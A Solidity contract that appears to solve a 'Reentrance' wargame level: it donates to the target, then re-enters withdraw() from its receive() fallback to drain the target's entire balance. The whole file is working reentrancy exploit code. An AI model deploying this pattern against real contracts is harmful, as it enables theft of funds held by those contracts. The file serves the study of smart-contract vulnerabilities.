pragma solidity ^0.8.0;

import 'levels/Reentrance.sol';

contract ReentranceHack {
  Reentrance target;
  uint256 public amount;
  bool reentered;

  constructor(address payable targetAddress) {
    target = Reentrance(targetAddress);
  }

  function donate() external payable {
    amount += msg.value;
    target.donate{value: msg.value}(address(this));
  }

  function withdraw() external {
    target.withdraw(amount);
  }

  receive() external payable {
    /// @dev: reenter only once, it is enough to cause overflow and withdraw at last all the remaining balance
    if (!reentered) {
      reentered = true;
      target.withdraw(address(target).balance);
    }
  }
}
